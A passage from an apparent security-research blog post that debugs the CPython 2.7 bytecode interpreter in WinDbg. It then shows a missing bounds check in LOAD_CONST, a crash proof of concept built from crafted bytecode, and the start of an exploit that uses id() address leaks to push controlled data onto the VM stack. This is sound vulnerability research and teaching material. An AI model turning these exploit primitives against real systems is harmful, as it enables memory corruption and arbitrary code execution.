  &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GETLOCAL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Py_INCREF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;PUSH&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="c1"&gt;//...&lt;/span&gt;
  &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's see what it looks like in assembly:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt;
eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x31f:
1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After getting the &lt;em&gt;fastlocals&lt;/em&gt;, we can retrieve an entry:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt;
eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x323:
1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Also keep in mind we called our dummy function with two strings, so let's actually check it is a string object:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; dps 025eaaa0 l2
025eaaa0  00000004
025eaaa4  1e226798 python27!PyString_Type
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfect, now according to the definition of &lt;em&gt;PyStringObject&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;PyObject_VAR_HEAD&lt;/span&gt;
    &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;ob_shash&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ob_sstate&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ob_sval&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;PyStringObject&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We should find the content of the string directly in the object:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; db 025eaaa0 l1f
025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g&amp;quot;.......0C
025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Awesome, we have the size of the string at the offset &lt;em&gt;0x8&lt;/em&gt;, and the actual string is at &lt;em&gt;0x14&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Let's move on to the second opcode now, this time with less details though:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This time, we are loading the second argument, so the index 1 of &lt;em&gt;fastlocals&lt;/em&gt;.
We can type-check the object and dump the string stored in it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x323:
1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
0:000&amp;gt; db poi(026bf0d4) l1f
025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g&amp;quot;.....9J%)
025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comes now the &lt;em&gt;BINARY_ADD&lt;/em&gt; opcode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here it's supposed to retrieve the two objects on the top-of-stack, and add them.
The C code looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SET_TOP(v)        (stack_pointer[-1] = (v))&lt;/span&gt;

&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;BINARY_ADD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;POP&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TOP&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyInt_CheckExact&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;PyInt_CheckExact&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Not our case&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyString_CheckExact&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
           &lt;span class="n"&gt;PyString_CheckExact&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string_concatenate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;next_instr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="cm"&gt;/* string_concatenate consumed the ref to v */&lt;/span&gt;
      &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;skip_decref_vx&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Not our case&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="n"&gt;Py_DECREF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nl"&gt;skip_decref_vx&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;Py_DECREF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;SET_TOP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And here is the assembly version where it retrieves the two objects from the top-of-stack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa45:
1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
...
0:000&amp;gt; 
eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa4b:
1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
0:000&amp;gt; 
eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa4e:
1e0eccfe 83ed04          sub     ebp,4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A bit further we have our string concatenation:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
python27!PyEval_SliceIndex+0x813:
1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
0:000&amp;gt; dd esp l3
0027fcb8  0027fcd0 025eafc0 025eaaa0
0:000&amp;gt; p
eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
python27!PyEval_SliceIndex+0x818:
1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
0:000&amp;gt; db poi(0027fcd0) l1f
025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g&amp;quot;.........
025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And the last part of the case is to push the resulting string onto the virtual stack (&lt;em&gt;SET_TOP&lt;/em&gt; operation):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
python27!PyEval_EvalFrameEx+0x8d2:
1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Last part of our deep dive, the &lt;em&gt;RETURN_VALUE&lt;/em&gt; opcode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0:000&amp;gt; 
eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use that information in gdb ; it should make your life easier (....but I hate gdb man...).&lt;/p&gt;
&lt;p&gt;Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :-).&lt;/p&gt;
&lt;h1 id="the-bug"&gt;The bug&lt;/h1&gt;
&lt;p&gt;Here is the bug, spot it and give it some love:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#ifndef Py_DEBUG&lt;/span&gt;
&lt;span class="cp"&gt;#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))&lt;/span&gt;
&lt;span class="cp"&gt;#else&lt;/span&gt;
&lt;span class="c1"&gt;//...&lt;/span&gt;
&lt;span class="cm"&gt;/* Macro, trading safety for speed &amp;lt;-- LOL, :) */&lt;/span&gt; 
&lt;span class="cp"&gt;#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))-&amp;gt;ob_item[i])&lt;/span&gt;

&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;LOAD_CONST&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GETITEM&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;consts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;Py_INCREF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;PUSH&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;fast_next_opcode&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This may be a bit obscure for you, but keep in mind we control the index &lt;em&gt;oparg&lt;/em&gt; and the content of &lt;em&gt;consts&lt;/em&gt;. That means we can just push &lt;em&gt;untrusted&lt;/em&gt; data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;opcode&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;types&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;types&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CodeType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EXTENDED_ARG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xef\xbe&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;LOAD_CONST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;   &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xad\xde&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;..and as expected you get a fault (&lt;em&gt;oparg&lt;/em&gt; is &lt;em&gt;edi&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
[...]
eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
python27!PyEval_EvalFrameEx+0x347:
1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By the way, some readers might have caught the same type of bug in &lt;em&gt;LOAD_FAST&lt;/em&gt; with the &lt;em&gt;fastlocals&lt;/em&gt; array ; those readers are definitely right :).&lt;/p&gt;
&lt;h1 id="walking-through-the-poc"&gt;Walking through the PoC&lt;/h1&gt;
&lt;p&gt;OK, so if you look only at the faulting instruction you could say that the bug is minor and we won't be able to turn it into something "useful". But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.&lt;/p&gt;
&lt;p&gt;As we said several times, from Python code you can't really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python objects. However, with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. If you do that well, you can end up causing the Python VM to call whatever address you want. That's exactly what I did back when I wrote &lt;a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py"&gt;python27_abuse_vm_to_execute_x86_code.py&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In Python we are really lucky because we can control a lot of things in memory and we have natively a way to "leak" (I shouldn't call that a leak though because it's a feature) the address of a Python object with the function &lt;em&gt;id&lt;/em&gt;. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.&lt;/p&gt;
&lt;h2 id="pushing-attacker-controlled-data-on-the-virtual-stack"&gt;Pushing attacker-controlled data on the virtual stack&lt;/h2&gt;
&lt;p&gt;We control &lt;em&gt;oparg&lt;/em&gt; and the content of the tuple &lt;em&gt;consts&lt;/em&gt;. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let's say &lt;em&gt;0xdeadbeef&lt;/em&gt; and it will be pushed on the virtual stack.&lt;/p&gt;
&lt;p&gt;Let's do that in Python now:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;opcode&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;types&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="n"&gt;consts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xef\xbe\xad\xde&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;address_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="c1"&gt;# 20 is the offset of the array of byte we control in the string&lt;/span&gt;
&lt;span class="n"&gt;address_consts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;consts&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# python27!PyEval_EvalFrameEx+0x347:&lt;/span&gt;
&lt;span class="c1"&gt;# 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????&lt;/span&gt;
&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;address_s&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;address_consts&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0xC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffffffff&lt;/span&gt;
&lt;span class="n"&gt;high&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;
&lt;span class="n"&gt;low&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffff&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Consts tuple @&lt;/span&gt;&lt;span class="si"&gt;%#.8x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;address_consts&lt;/span&gt;
